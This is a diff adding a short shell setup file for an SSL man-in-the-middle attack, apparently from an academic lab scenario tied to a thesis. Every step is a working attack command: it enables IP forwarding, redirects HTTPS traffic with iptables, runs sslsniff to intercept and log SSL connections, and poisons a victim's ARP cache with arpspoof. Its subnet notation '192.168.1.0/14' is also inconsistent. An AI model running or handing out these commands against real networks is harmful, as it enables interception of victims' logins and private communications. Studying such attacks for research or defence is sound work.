@@ -1,0 +1,20 @@
+# SETUP YOUR ATTACKER ON THE ROUTER
+# NATed subnet is: 192.168.1.0/14
+
+# Set up scenario as in attack_scenario.pdf
+# (section-6.1.pdf is an excerpt from Thomas's thesis, showing the ideas he followed)
+# (use your own routable IP addresses, of course)
+
+# Enable IP forwarding on your router
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Add a iptables-rule to intercept SSL traffic
+iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 999
+
+# Set up sslsniff to intercept all SSL-connections for which 
+# there are certificates in the /home/YOURUSER/certs-folder
+sslsniff -t -c /home/YOURUSER/certs -s 999 -w /home/YOURUSER/log.log
+
+# Poison the victim's ARP cache
+arpspoof -i eth0 -t 192.168.1.148 192.168.1.1
+
